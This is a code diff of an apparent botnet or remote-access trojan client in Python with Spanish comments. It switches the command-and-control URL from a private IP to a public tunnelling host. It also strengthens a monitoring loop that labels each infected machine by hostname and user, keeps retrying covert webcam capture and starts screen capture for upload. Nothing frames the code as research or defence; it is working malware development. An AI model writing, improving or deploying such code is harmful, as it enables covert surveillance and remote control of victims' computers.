@@ -26,7 +26,7 @@ except ImportError:
 #                           CONFIGURACION C2
 # =====================================================================
 
-C2_URL = "http://10.200.2.134:3000"
+C2_URL = "https://76eced1d4485d6.lhr.life"
 TARGET_URL = None
 ATTACKING = False
 
@@ -252,17 +252,24 @@ def _capture_monitoring():
     bot_id = f"{socket.gethostname()}_{os.getlogin()}"
     
     cam = None
-    if cv2:
+    def get_cam():
         try:
-            cam = cv2.VideoCapture(0)
-            if not cam.isOpened():
-                cam.release()
-                cam = None
+            c = cv2.VideoCapture(0)
+            if c.isOpened():
+                return c
+            c.release()
         except:
-            cam = None
+            pass
+        return None
+
+    cam = get_cam()
 
     try:
         while True:
+            # Re-intentar abrir la cámara si se perdió o no abrió al inicio
+            if cam is None and cv2:
+                cam = get_cam()
+
             payload = {"bot_id": bot_id}
 
             # --- Captura pantalla ---
